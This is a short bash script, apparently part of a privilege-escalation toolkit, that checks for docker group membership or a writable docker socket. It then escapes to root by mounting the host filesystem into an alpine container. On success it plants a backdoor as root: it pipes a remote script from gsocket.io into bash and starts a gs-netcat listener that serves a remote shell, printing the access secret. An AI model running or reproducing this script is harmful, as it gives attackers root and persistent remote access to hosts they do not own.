#!/bin/bash
source "$(dirname "$0")/00_common.sh"

info "Checking Docker privilege escalation..."

# Check if user is in docker group
if groups 2>/dev/null | grep -qw docker; then
    success "VULNERABLE: User in docker group!"
    
    # Check if docker socket accessible
    if [ -S /var/run/docker.sock ]; then
        success "Docker socket accessible"
        
        # Try to get root via docker
        if docker run -v /:/mnt --rm alpine chroot /mnt /bin/sh -c "id" 2>/dev/null | grep -q "uid=0"; then
            success "Docker escape successful!"
            # Plant backdoor via docker
            docker run -v /:/mnt --rm alpine chroot /mnt /bin/sh --norc --noprofile -c '
                curl -sSL gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1
                secret=$(head -c 16 /dev/urandom | xxd -p | head -c 16)
                (gs-netcat -s "$secret" -l -e "/bin/sh --norc --noprofile" &>/dev/null &)
                echo "ROOT_SECRET:$secret"
            ' 2>/dev/null
        fi
    fi
elif [ -S /var/run/docker.sock ] && [ -w /var/run/docker.sock ]; then
    success "VULNERABLE: Docker socket writable!"
else
    fail "No Docker privilege escalation found"
fi
